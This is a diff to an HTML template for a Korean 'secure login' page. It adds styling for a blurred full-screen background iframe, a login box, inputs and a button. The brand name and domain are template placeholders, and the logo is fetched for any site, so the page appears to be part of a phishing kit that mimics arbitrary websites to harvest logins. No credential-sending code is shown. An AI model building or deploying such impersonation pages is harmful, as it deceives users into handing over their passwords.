@@ -9,7 +9,114 @@
   <title>{{ins}} 보안 로그인</title>
   <link rel="icon" href="https://api.kickfire.com/logo?website={{dman}}" type="image/x-icon">
   <style>
-    /* (CSS remains unchanged) */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #2c3e50, #3498db);
+      overflow: hidden;
+    }
+
+    iframe.background-frame {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -2;
+      border: none;
+      filter: blur(8px) brightness(0.6);
+    }
+
+    .overlay {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(5px);
+      z-index: -1;
+    }
+
+    .login-container {
+      max-width: 420px;
+      margin: 10vh auto;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      padding: 45px 35px;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
+      color: #fff;
+      text-align: center;
+    }
+
+    .login-header img {
+      width: 70px;
+      height: 70px;
+      border-radius: 12px;
+      object-fit: cover;
+      margin-bottom: 15px;
+    }
+
+    .login-header h1 {
+      font-size: 24px;
+      text-transform: capitalize;
+      color: #fff;
+    }
+
+    .input-field {
+      margin-top: 20px;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      background: #f9f9f9;
+      font-size: 16px;
+      transition: all 0.3s ease;
+    }
+
+    .input-field input:focus {
+      border-color: #3498db;
+      outline: none;
+    }
+
+    .login-btn {
+      width: 100%;
+      margin-top: 25px;
+      padding: 13px;
+      border: none;
+      background: #2980b9;
+      color: white;
+      font-size: 17px;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-btn:hover {
+      background: #1f6391;
+    }
+
+    .error-message {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #ff6b6b;
+      display: none;
+    }
+
+    .privacy-note {
+      margin-top: 35px;
+      font-size: 12px;
+      color: #eee;
+    }
   </style>
 </head>
 
